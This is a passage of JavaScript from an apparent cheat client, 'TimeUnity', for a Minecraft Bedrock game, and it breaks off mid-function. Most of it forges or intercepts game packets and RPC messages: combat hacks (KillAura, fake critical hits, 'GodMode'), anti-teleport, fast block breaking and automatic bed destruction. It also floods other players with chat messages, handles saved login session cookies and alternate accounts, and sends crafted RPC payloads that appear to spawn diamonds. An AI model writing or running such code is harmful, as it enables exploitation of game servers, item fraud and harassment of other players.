                BackTrack_Attack = false;
                return false;
            } else {
                return true;
            }
        }
        if (AntiTP_Enabled) {
            let MovePlayerData = ParseMovePlayer(data, false);
            if (MovePlayerData.runtimeId == LocalRuntimeId) {
                sendPlayerAuthInput({
                    pos: {
                        x: self_pos.x,
                        y: self_pos.y,
                        z: self_pos.z
                    },
                    inputs: [24, 37, 52]
                });
                _minecraft.clientMessage("§l§b[TimeUnity]§r §7>> §c已拦截传送");
                return true;
            }
            return false;
        }
        if (ParticleBoom_TargetIds.length > 0) {
            let MovePlayerData = ParseMovePlayer(data, false);
            const runtimeId = MovePlayerData.runtimeId.toString();
            ParticleBoom_PlayerMoveData[runtimeId] = MovePlayerData;
        }
        if (AntiViewReset) {
            let MovePlayerData = ParseMovePlayer(data, false);
            if (MovePlayerData.runtimeId == LocalRuntimeId) {
                MovePlayerData.rot = self_rot;
                return ParseMovePlayer(MovePlayerData, true);
            }
            return false;
        }
    }
    if (NoReceivePacket) return true;
    if ((id == 85 || id == 61) && KillAura_Enabled && KillAura_Transferred) {
        KillAura_Enabled = false;
        _minecraft.clientMessage(`§l§b[TimeUnity]§r §7>> §cAuto Disable KillAura`);
    }
    if ((id == 85 || id == 61) && AutoBox_History.length > 0) {
        AutoBox_RemoveShape();
    }
    if (id === 12) {
        PlayerMap.push(ParseAddPlayer(data));
    }
    if (id === 14) {
        const PlayerId = ParseRemoveActor(data).uniqueId;
        const PlayerName = getEntityName(PlayerId);
        if (PlayerName) {
            const index = PlayerMap.findIndex(p => p.name === PlayerName);
            if (index !== -1) {
                PlayerMap.splice(index, 1);
            }
        }
    }
    if (id === 11) {
        if (CustomName_Enabled) {
            callModule(71, JSON.stringify({
                content: "",
                packet: false,
                value: false
            }));
        }
        PlayerMap = [];
        LocalRuntimeId = ParseStartGame(data);
        if (LocalPlayerName) {
            PlayerMap.push({
                id: LocalRuntimeId,
                name: LocalPlayerName
            });
        }
    }
    // if (id === 9 || id === 63 || id === 108) {
    // return ModifyPacket(id, data, LocalPlayerName, "§eTime§6Unity§dUser§f");
    // }
    return false;
}

function Summon() {
    sendPyRpc(98247598, '93c40163920681c4057374617274cf0000018fb5671c15c0');
    sendPyRpc(98247598, '93c401729208c4244d696e6563726166743a7065743a74656c65706f72745f6d6f756e745f72657175657374c0');
    sendPyRpc(98247598, generateRpcHex(self_id));
}

function generateRpcHex(Horse_Summon_Rpc) {
    const Horse_Summon = 'c4' + Horse_Summon_Rpc.length.toString(16).padStart(2, '0') + stringToHex(Horse_Summon_Rpc);
    let replace = '93c40163920881c408706c617965724964c40b2d34323934393637323935c0'.replace(/c40b2d34323934393637323935/, Horse_Summon);
    return replace;
}

function stringToHex(Horse_Summon_Get) {
    return Horse_Summon_Get.split('').map(element => ('00' + element.charCodeAt(0).toString(16)).slice(-2)).join('');
}

function AutoLoot() {
    if (AutoLoot_Enabled) {
        if (itemMagnetDelay >= 5) {
            getEntityList().forEach(entityId => {
                if ((AutoLoot_xp_orb && getEntityNamespace(entityId) === 'minecraft:xp_orb') || (AutoLoot_item && getEntityNamespace(entityId) === 'minecraft:item')) {
                    sendPlayerAuthInput({
                        pos: {
                            x: getEntityPos(entityId).x,
                            y: getEntityPos(entityId).y,
                            z: getEntityPos(entityId).z
                        }
                    });
                }
            });
            itemMagnetDelay = -1;
        }
        itemMagnetDelay++;
    }
}

function CmdFile() {
    if (Date.now() - (this.lastCmdTime || 0) < 1000 / CmdBoost) return;
    this.lastCmdTime = Date.now();
    _fs.read(_app.getResource() + "/TimeUnity/Cmd.txt").split('\n').forEach(cmd => cmd.trim() && sendCommandRequest(cmd.trim()));
}

/*@变速*/
function Timer() {
    if (Timer_Enabled || Blink_Enabled) {
        callModule(30, '{"value":false,"speed":' + Timer_speed + '}');
    }
}
/*#变速*/


/*@聊天卡人*/
function ChatLock() {
    if (_app.isInGame()) {
        if (ChatLock_Enabled && ChatLock_Whole) {
            getWorldPlayerList().filter(player => player.name !== getEntityName(self_id)).map(player => player.name).forEach(player => {
                sendCommandRequest(`/tell "${player}" ${BrushData}`);
            });
        }
        ChatLock_add.forEach(ChatLock_player => {
            for (let i = 0; i < 2; i++) {
                sendCommandRequest(`/tell "${ChatLock_player}" ${BrushData}`);
            }
        });
    }
}
/*#聊天卡人*/

function onCommandOutputEvent(type, args, value) {
    return true;
}

function onExecuteCommandEvent(command) {
    if (command.startsWith("/TU bind ")) {
        const [_, __, KeyName, key] = command.split(/\s+/);
        if (KeyName && key) {
            TU_Bind_Key[key] = KeyName;
            _minecraft.clientMessage("§a绑定成功: " + TU_Bind_Key);
        } else {
            _minecraft.clientMessage("§c格式错误 §7请使用: §e/TU bind <Module> <Key>");
        }
        return true;
    }
    if (command === "/LocalMenu") {
        LocalMenu();
        _minecraft.clientMessage("§a保存成功 §7请使用open调用TU主菜单");
        return true;
    }
    return false;
}

function onKeyboardDownEvent(key) {
    // if (TU_Bind_Key[KeyCode.key]) {
    // _minecraft.clientMessage(TU_Bind_Key[KeyCode.key]);
    // }
}


function decodePartialUnicode(str) {
    return str.replace(/\\u([0-9A-Fa-f]{4})/g, (match, grp) => {
        return String.fromCharCode(parseInt(grp, 16));
    });
}
async function fetchData(url, body = '', retries = 3, delay = 1000) {
    for (let attempt = 0; attempt < retries; attempt++) {
        try {
            const data = await new Promise((resolve, reject) => {
                curl_post_game_api(url, body, (code, responseData) => {
                    if (code === 200) {
                        resolve(decodePartialUnicode(responseData));
                    } else {
                        reject(new Error(`API call failed. Code: ${code}`));
                    }
                });
            });
            const jsonData = JSON.parse(data);
            if (jsonData.code !== 0) {
                throw new Error(`API error. Code: ${jsonData.code}, Message: ${jsonData.message} ${jsonData.data}`);
            }
            return jsonData;
        } catch (error) {
            if (attempt < retries - 1) {
                await new Promise(resolve => setTimeout(resolve, delay));
            } else {
                throw error;
            }
        }
    }
}

function onSAuthJsonHookEvent(cookie) {
    if (CookieLogin) {
        if (CookieLogin_Cookie != null && CookieLogin_Cookie != undefined && CookieLogin_Cookie != "") {
            _app.showToast('Cookie登录成功');
            return JSON.parse(CookieLogin_Cookie).sauth_json;
        }
    }
    if (Sauth_4399Login) {
        if (!Sauth_4399_Cookie.includes("密码错误") && Sauth_4399_Cookie !== null) {
            _app.showToast('4399账号登录成功');
            return JSON.parse(Sauth_4399_Cookie).sauth_json;
        } else {
            _app.showToast('用户名或密码错误');
            return null;
        }
    };
    if (SaveCookie_Enabled) {
        _fs.write(_app.getResource() + "/TimeUnity/Cookie.json", JSON.stringify({
            sauth_json: cookie
        }));
        _app.showToast("已保存Cookie至TimeUnity/Cookie.json");
        return "";
    }
    if (infiniteCookie_Cookie != null) {
        _app.showToast('无限小号登录成功');
        const result = JSON.parse(infiniteCookie_Cookie).sauth_json;
        infiniteCookie_Cookie = null;
        return result;
    }
};

function onPlayerAttackEvent(playerId, targetId) {
    if (!attackList.includes(targetId)) {
        attackList.push(targetId);
    }
    if (AttackLightning_Enabled) {
        const AttackPos = getEntityPos(targetId);
        AttackPos.y -= 1.62;
        sendLocalPacket(13, BuildAddActorPacket({
            entityUniqueId: 123456789,
            entityRuntimeId: 123456789,
            identifier: "minecraft:lightning_bolt",
            position: AttackPos,
            velocity: {
                x: 0,
                y: 0,
                z: 0
            },
            pitch: 0,
            yaw: 0,
            headYaw: 0,
            bodyYaw: 0
        }));
        if (AttackLightning_Sound) {
            sendLocalPacket(123, BuildLevelSoundEventPacket({
                soundId: 47,
                position: AttackPos,
                extraData: -1,
                entityType: "minecraft:lightning_bolt",
                isBaby: false,
                isGlobal: true
            }));
            sendLocalPacket(123, BuildLevelSoundEventPacket({
                soundId: 48,
                position: AttackPos,
                extraData: -1,
                entityType: "minecraft:lightning_bolt",
                isBaby: false,
                isGlobal: true
            }));
        }
    }
    if (ChatLock_Enabled && ChatLock_Attack) {
        let attackerName = getEntityName(playerId);
        let targetName = getEntityName(targetId);
        for (let i = 0; i < 10; i++) {
            sendCommandRequest(`/tell "${targetName}" ${BrushData}`);
        }
        return false;
    }
    if (KillAura_Enabled && KillAura_SilentMode) {
        if (!AutoGapple_isEating) {
            let Player_CurrentSlot = getPlayerSelectItemSlot(self_id);
            let Weapon_MaxDamage = 0;
            let Weapon_BestSlots = [];
            for (let i = 0; i < getPlayerHotBarSize(self_id); i++) {
                let Item_Object = getPlayerInventoryItem(self_id, i);
                if (!Item_Object) continue;
                let Item_Name = getText(Item_Object, 'Name:"', '"') || getText(Item_Object, 'name:"', '"');
                if (!Item_Name || !/(sword|axe)/i.test(Item_Name)) continue;
                let Item_BaseDamage = Number(getText(Item_Object, 'attackDamage:', ',')) || 0;
                let Item_EnchantLevel = getEnchantLevel(getText(Item_Object, 'ench:[', ']') || "", 9);
                let Item_TotalDamage = Item_BaseDamage + Item_EnchantLevel * 1.25;
                if (Item_TotalDamage > Weapon_MaxDamage) {
                    Weapon_MaxDamage = Item_TotalDamage;
                    Weapon_BestSlots = [i];
                } else if (Item_TotalDamage === Weapon_MaxDamage) {
                    Weapon_BestSlots.push(i);
                }
            }
            if (Weapon_BestSlots.length > 0 && !Weapon_BestSlots.includes(Player_CurrentSlot)) {
                let Weapon_TargetSlot = Weapon_BestSlots[Math.floor(Math.random() * Weapon_BestSlots.length)];
                SilentPlayerInventorySlot(Weapon_TargetSlot, LocalRuntimeId);
            }
        }
    }
    if (BackTrack_Enabled && !BackTrack_Attack) BackTrack_Attack = true;
    if (GodMode_Enabled) {
        try {
            sendPlayerAuthInput({
                pos: getEntityPos(targetId),
                inputs: [24, 37, 52, 53]
            });
        } catch (e) {}
    }
    if (AttackParticle) {
        const pos = getEntityPos(targetId);
        const size = getEntitySize(targetId);
        if (isPlayer(targetId)) {
            pos.y -= 1.62;
        }
        DrawParticle(AttackParticle_ID, pos, size, AttackParticle_Num);
    }
    if (!Hammer_isAttack && Hammer_Enabled && getText(getEntityCarriedItem(self_id), 'Name:"', '"').replace(/^minecraft:/, '') === "mace") {
        Hammer_AttackTarget = targetId;
        Hammer_isAttack = true;
        return true;
    }
    if (Critical_Enabled && !Critical_isAttack && !InfiniteAura_Enabled) {
        if (getEntityIsGround(self_id)) {
            if (Critical_BJDMode) {
                Critical_isAttack2 = true;
                let currentTick1 = BigInt(PlayerAuthInput_ClientTick) + 1n;
                let currentTick2 = BigInt(PlayerAuthInput_ClientTick) + 2n;

                Intercepted_ClientTicks.push(currentTick1);
                Intercepted_ClientTicks.push(currentTick2);
                if (Intercepted_ClientTicks.length > 20) {
                    Intercepted_ClientTicks.splice(0, Intercepted_ClientTicks.length - 20);
                }

                let Base64Data = "8ESKQka3McNabhlCi3uVQgWiDkEAAAAAAAAAAEa3McOQgMAIAgIC8ESKQka3McOlCAAAAIA6wOO+AAAAgAAAAAAAAAAAACWSaDwmNm+/Oje2vgAAAAAAAAAAAO9EikJGtzHDAAAA";
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                const lookup = new Uint8Array(256);
                for (let i = 0; i < chars.length; i++) lookup[chars.charCodeAt(i)] = i;
                let length = Base64Data.length;
                while (length > 0 && Base64Data[length - 1] === '=') {
                    length--;
                }
                const len = Math.floor((length * 3) / 4);
                const baseBuffer = new Uint8Array(len);
                let a, b, c, d;
                let i = 0,
                    j = 0;
                while (i < length) {
                    a = lookup[Base64Data.charCodeAt(i++)];
                    b = lookup[Base64Data.charCodeAt(i++)];
                    c = lookup[Base64Data.charCodeAt(i++)];
                    d = lookup[Base64Data.charCodeAt(i++)];
                    baseBuffer[j++] = (a << 2) | (b >> 4);
                    if (j < len) baseBuffer[j++] = ((b & 15) << 4) | (c >> 2);
                    if (j < len) baseBuffer[j++] = ((c & 3) << 6) | d;
                }

                function buildBufferWithTick(originalBuffer, newTickValue) {
                    let tickIndex = -1;
                    for (let k = 32; k < originalBuffer.length - 1; k++) {
                        if (originalBuffer[k] === 165 && originalBuffer[k + 1] === 8) {
                            tickIndex = k;
                            break;
                        }
                    }
                    if (tickIndex === -1) return originalBuffer;

                    let newVarInt = [];
                    let temp = BigInt(newTickValue);
                    while (temp > 127n) {
                        newVarInt.push(Number((temp & 127n) | 128n));
                        temp >>= 7n;
                    }
                    newVarInt.push(Number(temp));

                    let newData = new Uint8Array(originalBuffer.length - 2 + newVarInt.length);
                    newData.set(originalBuffer.subarray(0, tickIndex), 0);
                    newData.set(newVarInt, tickIndex);
                    newData.set(originalBuffer.subarray(tickIndex + 2), tickIndex + newVarInt.length);
                    return newData;
                }

                let buffer1 = buildBufferWithTick(baseBuffer, currentTick1);
                let view1 = new DataView(buffer1.buffer);
                view1.setFloat32(0, Number(self_rot.pitch), true);
                view1.setFloat32(4, Number(self_rot.yaw), true);
                view1.setFloat32(8, Number(self_pos.x), true);
                view1.setFloat32(12, Number(self_pos.y), true);
                view1.setFloat32(16, Number(self_pos.z), true);
                view1.setFloat32(20, 50, true);
                view1.setFloat32(24, 50, true);
                view1.setFloat32(28, Number(self_rot.yaw), true);

                sendNetworkPacket(144, buffer1);

                let buffer2 = buildBufferWithTick(baseBuffer, currentTick2);
                let view2 = new DataView(buffer2.buffer);
                if (PlayerAuthInput_Rot) {
                    view2.setFloat32(0, Number(PlayerAuthInput_Rot.pitch), true);
                    view2.setFloat32(4, Number(PlayerAuthInput_Rot.yaw), true);
                    view2.setFloat32(28, Number(PlayerAuthInput_Rot.yaw), true);
                } else {
                    view2.setFloat32(0, Number(self_rot.pitch), true);
                    view2.setFloat32(4, Number(self_rot.yaw), true);
                    view2.setFloat32(28, Number(0), true);
                }
                view2.setFloat32(8, Number(self_pos.x), true);
                view2.setFloat32(12, Number(self_pos.y), true);
                view2.setFloat32(16, Number(self_pos.z), true);
                view2.setFloat32(20, 50, true);
                view2.setFloat32(24, 50, true);
                sendNetworkPacket(144, buffer2);
            } else {
                for (let i = 0; i < 10; i++) {
                    sendPlayerAuthInput({
                        pos: {
                            x: self_pos.x,
                            y: self_pos.y + 0.1,
                            z: self_pos.z
                        }
                    });
                }
            }
            Critical_SilentRot = null;
            Critical_isAttack = true;
            if (Critical_AttackTarget === null) Critical_AttackTarget = targetId;
            return true;
        }
    }
    if (AttackSound && (!playSound.lastPlay || Date.now() - playSound.lastPlay >= 2000)) {
        playSound(_app.getResource() + "/TimeUnity/Sound/攻击音效.mp3", 100, 100);
        playSound.lastPlay = Date.now();
    }
    if (AttackESP_Enabled) {
        const Target_Pos = getEntityPos(targetId);
        const entityType = getEntityNamespace(targetId);
        if (entityType === 'minecraft:item' || entityType === 'minecraft:xp_orb' || entityType === 'netease:pet' || entityType === 'minecraft:arrow' || entityType === 'minecraft:thrown_trident') return;
        for (let i = 0; i < AttackESP_length; i++) {
            sendPlayerAction({
                id: self_id,
                pos: {
                    x: Math.floor(Target_Pos.x),
                    y: Math.floor(Target_Pos.y + i),
                    z: Math.floor(Target_Pos.z)
                },
                type: 17
            });
        }
    }
}

function PacketDestroy(x, y, z, blockDestroyTime, PacketDestroy_Speed, isDestroy) {
    if (blockDestroyTime == 0) return;
    if (isDestroy) {
        sendPlayerAction({
            id: self_id,
            pos: {
                x: x,
                y: y,
                z: z
            },
            type: 0
        });
    }
    for (let i = 0; i < Math.floor(blockDestroyTime * PacketDestroy_Speed); i++) {
        sendPlayerAuthInput({
            playMode: 2
        });
    }
}

function TeleMineDestroy(x, y, z) {
    sendPlayerAction({
        id: self_id,
        pos: {
            x: x,
            y: y,
            z: z
        },
        type: 0
    });
    for (let i = 0; i < TeleMine_Packet; i++) {
        sendPlayerAuthInput({
            playMode: 2
        });
    }
}

function PacketDestroys(x, y, z) {
    sendPlayerAction({
        id: self_id,
        pos: {
            x: x,
            y: y,
            z: z
        },
        type: 0
    });
}

function PacketSleep() {
    if (PacketSleep_Enabled) {
        sendPlayerAction({
            id: self_id,
            pos: {
                x: self_pos.x,
                y: self_pos.y,
                z: self_pos.z
            },
            value: 1,
            type: 5
        });
        sendPlayerAction({
            id: self_id,
            pos: {
                x: self_pos.x,
                y: self_pos.y,
                z: self_pos.z
            },
            value: 1,
            type: 6
        });
    }
}

function AutoBox() {
    if (!AutoBox_Enabled) return;
    if (AutoBox_History.length > 0 && getEntityAttribute(self_id, "minecraft:health").current <= 0) {
        AutoBox_RemoveShape();
    }
    if (ContainerOpenState === "Chest") return;
    while (ContainerOpenQueue.length > 0) {
        const openedPos = ContainerOpenQueue.shift();
        const bx = Math.floor(openedPos.x);
        const by = Math.floor(openedPos.y);
        const bz = Math.floor(openedPos.z);
        if (Pending_AutoBox && bx === Pending_AutoBox.x && by === Pending_AutoBox.y && bz === Pending_AutoBox.z) {
            if (getBlock(bx, by, bz).namespace !== "minecraft:chest") continue;
            const posStr = `${bx},${by},${bz}`;
            let found = false;
            for (let m = 0; m < AutoBox_History.length; m++) {
                if (AutoBox_History[m].pos === posStr) {
                    found = true;
                    break;
                }
            }
            if (!found) {
                if (AutoBox_RenderShape) {
                    let id = createShape({
                        type: 'box',
                        isFill: true,
                        lower: {
                            x: bx,
                            y: by,
                            z: bz
                        },
                        upper: {
                            x: bx + 1,
                            y: by + 1,
                            z: bz + 1
                        },
                        color: {
                            r: 1,
                            g: 1,
                            b: 1,
                            a: 0.5
                        }
                    });
                    AutoBox_History.push({
                        pos: posStr,
                        id: id
                    });
                } else {
                    AutoBox_History.push({
                        pos: posStr
                    });
                }
            }
            Pending_AutoBox = null;
        }
    }
    AutoBox_Data++;
    if (AutoBox_Data >= 5) {
        AutoBox_Data = 0;
        const start_x = Math.floor(self_pos.x) - AutoBox_Range;
        const start_y = Math.floor(self_pos.y) - 1 - AutoBox_Range;
        const start_z = Math.floor(self_pos.z) - AutoBox_Range;
        const end = AutoBox_Range * 2;
        for (let i = 0; i <= end; i++) {
            for (let j = 0; j <= end; j++) {
                for (let k = 0; k <= end; k++) {
                    const block_x = start_x + i;
                    const block_y = start_y + j;
                    const block_z = start_z + k;
                    if (getBlock(block_x, block_y, block_z).namespace !== "minecraft:chest") continue;
                    const aboveBlock = getBlock(block_x, block_y + 1, block_z).namespace;
                    if (aboveBlock !== "minecraft:air" && aboveBlock !== "minecraft:water" && aboveBlock !== "minecraft:chest" && !aboveBlock.includes("glass") && !aboveBlock.includes("slab") && !aboveBlock.includes("leaves") && !aboveBlock.includes("sign")) {
                        continue;
                    }
                    if (getBlock(block_x, block_y - 1, block_z).namespace === "minecraft:air") continue;
                    const posStr = `${block_x},${block_y},${block_z}`;
                    let found = false;
                    for (let m = 0; m < AutoBox_History.length; m++) {
                        if (AutoBox_History[m].pos === posStr) {
                            found = true;
                            break;
                        }
                    }
                    if (found) continue;
                    const dx = (block_x + 0.5) - self_pos.x;
                    const dy = (block_y + 0.5) - (self_pos.y + 1.62);
                    const dz = (block_z + 0.5) - self_pos.z;
                    const distance = Math.hypot(dx, dy, dz);
                    let isObstructed = false;
                    for (let step = 0.5; step < distance - 0.5; step += 0.2) {
                        const ratio = step / distance;
                        const px = self_pos.x + dx * ratio;
                        const py = self_pos.y + 1.62 + dy * ratio;
                        const pz = self_pos.z + dz * ratio;
                        const checkBlock = getBlock(Math.floor(px), Math.floor(py), Math.floor(pz)).namespace;
                        if (checkBlock !== "minecraft:air" && checkBlock !== "minecraft:water" && checkBlock !== "minecraft:chest") {
                            isObstructed = true;
                            break;
                        }
                    }
                    if (isObstructed) continue;
                    const Blocks = {
                        x: block_x + 0.5,
                        y: block_y,
                        z: block_z + 0.5
                    };
                    let pitch = getPlayerAngle(self_id, Blocks, "pitch_pos");
                    let yaw = getPlayerAngle(self_id, Blocks, "yaw_pos");
                    let yaw2 = yaw - 180;
                    if (pitch > 90) pitch -= 90;
                    if (pitch < -90) pitch += 90;
                    if (yaw2 > 180) yaw2 = yaw2 - 360;
                    if (yaw2 < -180) yaw2 = 360 + yaw2;
                    if (yaw2 > 180 || yaw2 < -180 || pitch > 90 || pitch < -90) continue;
                    setSilentRot(pitch, yaw2);
                    SilentBuildBlock(block_x, block_y, block_z, getPlayerSelectItemSlot(self_id));
                    Pending_AutoBox = {
                        x: block_x,
                        y: block_y,
                        z: block_z
                    };
                    return;
                }
            }
        }
    }
}

const StartDestroyBlock = (x, y, z, face = 1) => {
    const Block = getBlock(x, y, z);
    const Slot = getPlayerSelectItemSlot(self_id);
    const Speed = getPlayerBlockDestroyTime(self_id, Slot, Block.namespace);
    if (Speed <= 0) return;
    AutoDestroyBed_IsMining = true;
    AutoDestroyBed_MiningTarget = {
        x,
        y,
        z,
        face,
        namespace: Block.namespace
    };
    AutoDestroyBed_Progress = 0;
    AutoDestroyBed_MiningSpeed = Speed;
    sendPlayerAuthInput({
        pos: {
            x: self_pos.x,
            y: self_pos.y,
            z: self_pos.z
        },
        inputMode: 2,
        playMode: 2,
        inputs: [4, 20, 24, 35, 52],
        actions: [{
            type: 0,
            pos: {
                x,
                y,
                z
            },
            value: face
        }]
    });
};

const AutoDestroyBed = () => {
    if (!AutoDestroyBed_Enabled) return;
    if (AutoDestroyBed_IsMining) {
        const Target = AutoDestroyBed_MiningTarget;
        const CurrentBlock = getBlock(Target.x, Target.y, Target.z);
        if (CurrentBlock.namespace === "minecraft:air") {
            AutoDestroyBed_IsMining = false;
            AutoDestroyBed_MiningTarget = null;
            return;
        }
        AutoDestroyBed_Progress += AutoDestroyBed_MiningSpeed * 2;
        const Progress = Math.min(AutoDestroyBed_Progress, 1);
        sendPlayerAuthInput({
            pos: {
                x: self_pos.x,
                y: self_pos.y,
                z: self_pos.z
            },
            inputMode: 2,
            playMode: 2,
            inputs: [4, 20, 24, 35, 52],
            actions: [{
                type: 26,
                pos: {
                    x: Target.x,
                    y: Target.y,
                    z: Target.z
                },
                value: Target.face
            }]
        });
        if (Progress >= 1) {
            sendPlayerAuthInput({
                pos: {
                    x: self_pos.x,
                    y: self_pos.y,
                    z: self_pos.z
                },
                inputMode: 2,
                playMode: 2,
                inputs: [4, 20, 24, 35, 52],
                actions: [{
                    type: 1,
                    pos: {
                        x: Target.x,
                        y: Target.y,
                        z: Target.z
                    },
                    value: Target.face
                }]
            });
            AutoDestroyBed_IsMining = false;
            AutoDestroyBed_MiningTarget = null;
        }
        return;
    }
    AutoDestroyBed_Data++;
    if (AutoDestroyBed_Data < 5) return;
    AutoDestroyBed_Data = 0;
    const GetDistance = (px, py, pz) => {
        const dx = self_pos.x - px;
        const dy = self_pos.y - py;
        const dz = self_pos.z - pz;
        return dx * dx + dy * dy + dz * dz;
    };
    const StartX = Math.floor(self_pos.x) - AutoDestroyBed_Range;
    const StartY = Math.floor(self_pos.y) - AutoDestroyBed_Range;
    const StartZ = Math.floor(self_pos.z) - AutoDestroyBed_Range;
    const End = AutoDestroyBed_Range * 2;
    const Dirs = [{
            x: 0,
            y: 1,
            z: 0
        },
        {
            x: 0,
            y: -1,
            z: 0
        },
        {
            x: 1,
            y: 0,
            z: 0
        },
        {
            x: -1,
            y: 0,
            z: 0
        },
        {
            x: 0,
            y: 0,
            z: 1
        },
        {
            x: 0,
            y: 0,
            z: -1
        }
    ];

    let NearestBed = null;
    let MinBedDist = Infinity;

    for (let i = 0; i <= End; i++) {
        for (let j = 0; j <= End; j++) {
            for (let k = 0; k <= End; k++) {
                const x = StartX + i;
                const y = StartY + j;
                const z = StartZ + k;
                const Block = getBlock(x, y, z);

                if (Block.namespace.includes("bed")) {
                    const Dist = GetDistance(x, y, z);
                    if (Dist < MinBedDist) {
                        MinBedDist = Dist;
                        NearestBed = {
                            x,
                            y,
                            z
                        };
                    }
                }
            }
        }
    }

    if (!NearestBed) return;

    let IsBedExposed = false;
    for (const d of Dirs) {
        const AdjBlock = getBlock(NearestBed.x + d.x, NearestBed.y + d.y, NearestBed.z + d.z);
        if (AdjBlock.namespace === "minecraft:air") {
            IsBedExposed = true;
            break;
        }
    }

    if (IsBedExposed) {
        StartDestroyBlock(NearestBed.x, NearestBed.y, NearestBed.z, 1);
        return;
    }

    const Visited = new Set();
    const Queue = [];

    for (const d of Dirs) {
        const nx = NearestBed.x + d.x;
        const ny = NearestBed.y + d.y;
        const nz = NearestBed.z + d.z;
        const AdjBlock = getBlock(nx, ny, nz);

        if (AdjBlock.namespace !== "minecraft:air" && !AdjBlock.namespace.includes("bed")) {
            const Key = `${nx},${ny},${nz}`;
            Visited.add(Key);
            Queue.push({
                x: nx,
                y: ny,
                z: nz
            });
        }
    }

    let TargetToMine = null;

    while (Queue.length > 0) {
        Queue.sort((a, b) => GetDistance(a.x, a.y, a.z) - GetDistance(b.x, b.y, b.z));
        const Curr = Queue.shift();

        let CurrExposed = false;
        for (const d of Dirs) {
            const AdjBlock = getBlock(Curr.x + d.x, Curr.y + d.y, Curr.z + d.z);
            if (AdjBlock.namespace === "minecraft:air") {
                CurrExposed = true;
                break;
            }
        }

        if (CurrExposed) {
            TargetToMine = Curr;
            break;
        }

        for (const d of Dirs) {
            const nx = Curr.x + d.x;
            const ny = Curr.y + d.y;
            const nz = Curr.z + d.z;
            const Key = `${nx},${ny},${nz}`;

            if (!Visited.has(Key)) {
                const AdjBlock = getBlock(nx, ny, nz);
                if (AdjBlock.namespace !== "minecraft:air" && !AdjBlock.namespace.includes("bed")) {
                    Visited.add(Key);
                    Queue.push({
                        x: nx,
                        y: ny,
                        z: nz
                    });
                }
            }
        }
    }

    if (TargetToMine) {
        StartDestroyBlock(TargetToMine.x, TargetToMine.y, TargetToMine.z, 1);
    }
};


function DropCarriedItem() {
    if (DropCarriedItem_Enabled) {
        if (!getEntityCarriedItem(self_id).includes('Count:0b')) {
            sendPyRpc(98247598, "93c40172920dc41f4d696e6563726166743a7065743a64726f705f7065745f6261675f6974656dc0");
            for (let i = 10; i < 15; i++) {
                _packet.sendPyRpcPacket(98247598, `{\"type\":\"array\",\"value\":[{\"type\":\"binary\",\"value\":\"c\"},{\"type\":\"array\",\"value\":[{\"type\":\"uint\",\"value\":${i}},{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"playerId\"},\"value\":{\"type\":\"binary\",\"value\":\"${self_id}\"}},{\"key\":{\"type\":\"binary\",\"value\":\"slot\"},\"value\":{\"type\":\"uint\",\"value\":${getPlayerSelectItemSlot(self_id)}}},{\"key\":{\"type\":\"binary\",\"value\":\"isNewRequest\"},\"value\":{\"type\":\"boolean\",\"value\":true}},{\"key\":{\"type\":\"binary\",\"value\":\"item\"},\"value\":{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"count\"},\"value\":{\"type\":\"uint\",\"value\":15}},{\"key\":{\"type\":\"binary\",\"value\":\"newItemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:diamond\"}},{\"key\":{\"type\":\"binary\",\"value\":\"modItemId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"enchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"durability\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"itemId\"},\"value\":{\"type\":\"uint\",\"value\":264}},{\"key\":{\"type\":\"binary\",\"value\":\"customTips\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"extraId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"newAuxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"modEnchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"modId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"userData\"},\"value\":{\"type\":\"nil\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isDiggerItem\"},\"value\":{\"type\":\"boolean\",\"value\":false}},{\"key\":{\"type\":\"binary\",\"value\":\"itemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:diamond\"}},{\"key\":{\"type\":\"binary\",\"value\":\"auxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"showInHand\"},\"value\":{\"type\":\"boolean\",\"value\":true}}]}}]}]},{\"type\":\"nil\"}]}`);
            }
        }
    }
}

function BJD_Deputy() {
    if (BJD_Deputy_Enabled) {
        if (!getEntityCarriedItem(self_id).includes('Count:0b')) {
            const item = getInventoryItem(getPlayerSelectItemSlot(self_id));
            const item2 = nbt2object(getEntityOffhandItem(self_id))
            swapContainerItem([{
                fromSlot: getPlayerSelectItemSlot(self_id),
                fromNetId: item.id || 0,
                fromContainerId: 12,
                toSlot: 0,
                toNetId: item2.id || 0,
                toContainerId: 35,
                count: item.count
            }]);
        }
    }
}

function AutoGapple() {
    if (AutoGapple_Enabled) {
        if (AutoGapple_IsActive) {
            if (AutoGapple_isEating) {
                let currentSlot = getPlayerSelectItemSlot(self_id);
                SilentPlayerInventorySlot(currentSlot, LocalRuntimeId);
                AutoGapple_isEating = false;
            }
            return;
        }
        if (self_Health <= AutoGapple_Health && self_Health > 0) {
            let FoundGappleSlot = -1;
            let FallbackGappleSlot = -1;
            let FallbackItemName = "";
            for (let slot = 0; slot < getPlayerHotBarSize(self_id); slot++) {
                let itemData = getPlayerInventoryItem(self_id, slot);
                if (itemData) {
                    let shortName = getText(itemData, 'Name:"', '"').replace(/^minecraft:/, '');
                    if (shortName === "enchanted_golden_apple") {
                        FoundGappleSlot = slot;
                        break;
                    } else if (shortName === "golden_apple" && FallbackGappleSlot === -1) {
                        FallbackGappleSlot = slot;
                        FallbackItemName = "golden_apple";
                    }
                }
            }
            if (FoundGappleSlot === -1 && FallbackGappleSlot !== -1) {
